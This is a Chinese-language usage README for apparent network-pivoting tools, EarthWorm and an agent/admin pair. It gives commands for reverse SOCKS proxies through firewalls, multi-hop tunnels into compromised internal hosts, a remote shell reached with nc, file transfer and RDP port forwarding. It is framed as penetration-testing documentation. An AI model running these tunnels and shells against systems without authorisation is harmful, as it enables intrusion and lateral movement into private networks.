# EW

【使用场景】

    普通网络环境：
        1.  目标网络边界存在公网IP且可任意开监听端口：

                  +---------+     +-------------------+  
                  |HackTools| ->> | 8888->  1.1.1.1   |
                  +---------+     +-------------------+

                a)./ew -s ssocksd -l 8888
                        // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理
                b) HackTools 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理
                    
        2.  目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理
            
                                        一台可控公网IP主机                  可控内网主机
                  +---------+     +--------------------------+    |     +---------------+
                  |HackTools| ->> | 1080 ->  1.1.1.1 -> 8888 |  防火墙  | <--  2.2.2.2  |
                  +---------+     +--------------------------+    |     +---------------+

                a) ./ew -s rcsocks -l 1080 -e 8888
                            // 在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机
                b) ./ew -s rssocks -d 1.1.1.1 -e 8888          
                            // 将目标网络的可控边界主机反向连接公网主机

                c) HackTools 可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务

    对于二重网络环境：        
        1.  获得目标网络内两台主机 A、B 的权限，情况描述如下：

                A 主机：  存在公网 IP，且自由监听任意端口，无法访问特定资源
                B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网
                A 主机可直连 B 主机
                
                                        可控边界主机A             可访问指定资源的主机B
                  +---------+     +-----------------------+      +-----------------+
                  |HackTools| ->> | 1080 -->  2.2.2.2 --> | ->>  | 9999 -> 2.2.2.3 |
                  +---------+     +-----------------------+      +-----------------+

                a)  ./ew -s ssocksd -l 9999
                        // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
                b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 
                        // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机。
                c)  HackTools 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。
                
        2.  获得目标网络内两台主机 A、B 的权限，情况描述如下：

                A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。
                B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。

                A 主机可直连 B 主机
                                      一台可控公网IP主机                    可控内网主机A         可访问指定资源的主机B
                  +---------+     +--------------------------+    |    +-----------------+      +-----------------+
                  |HackTools| ->> | 1080 ->  1.1.1.1 -> 8888 |  防火墙  | <--  2.2.2.2 --> | ->> | 9999 -> 2.2.2.3 |
                  +---------+     +--------------------------+    |    +-----------------+      +-----------------+

                a)  ./ew -s lcx_listen -l 1080 -e 8888
                            // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求
                            // 转交给反连 8888 端口的主机
                b)  ./ew -s ssocksd -l 9999
                            // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
                c)  ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
                            // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道
                d)  HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理


【参数说明】

    目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:

        ssocksd   rcsocks   rssocks   
        lcx_slave lcx_tran  lcx_listen

        其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。

        其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。
    
    lcx 类别管道：

        lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
        lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
        lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
    
        通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。

        下面是一个三级跳的本地测试例子。。。
        ./ew -s rcsocks -l 1080 -e 8888
        ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
        ./ew -s lcx_listen -l 9999 -e 7777
        ./ew -s rssocks -d 127.0.0.1 -e 7777

        数据流向为   IE -> 1080 -> 8888 -> 9999 -> 7777 -> rssocks 

【补充说明】
        1.为了减少网络资源的消耗，程序中添加了超时机制，默认时间为10000毫秒（10秒），
          用户可以通过追加 -t 参数来调整这个值，单位为毫秒。在多级级联功能中，超时机制
          将以隧道中最短的时间为默认值。
        2.单纯从设计原理上讲，多级级联的三种状态可以转发任意以TCP为基础的通讯服务，
          包括远程桌面／web服务 等。
        3.产品包中的 ew_for_Arm32 在开发者已有平台下（android手机、小米路由器、树莓派） 测试无误。
          如果有其它异常环境请将对应详细细节反馈给作者，以便更新程序问题。


# Agent

1. 以服务模式启动一个agent服务。

> $ ./agent -l 8888

2. 令管理端连接到agent并对agent进行管理。

> $ ./admin -c 127.0.0.1 -p 8888

3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。

>> help

4. 通过show指令可以得到当前agent的拓扑情况。

>> show 
 0M
 +-- 1M
 由于当前拓扑中只有一个agent，所以展示结果只有 1M ,
  其中1 为节点的ID号，
  M为MacOS系统的简写，Linux为L，Windows简写为W。

5. 将新agent加入当前拓扑
> ./agent -c 127.0.0.1 -p 8888

6. 此时show指令将得到如下效果
 0M
 +-- 1M
 |   +-- 2M
  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。

7. 在2节点开启socks代理，并绑定在本地端口
>> goto 2
    将当前被管理节点切换为 2 号节点。
>> socks 1080
   此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。

8. 在1号节点开启一个shell并绑定到本地端口
>> goto 1
>> shell 7777
     此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.

9. 将远程的文件下载至本地
>> goto 1
>> downfile 1.txt 2.txt
    将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt

10. 上传文件至远程节点
>> goto 2
>> upfile 2.txt 3.txt
    将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt

11. 端口转接
>> goto 2 
>> lcxtran 3388 10.0.0.1 3389
    以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口


# 更多支持
    http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4
    http://rootkiter.com/toolvideo/toolmp4/2socks.mp4
    http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4
    http://rootkiter.com/toolvideo/toolmp4/4shell.mp4
    http://rootkiter.com/toolvideo/toolmp4/5file.mp4
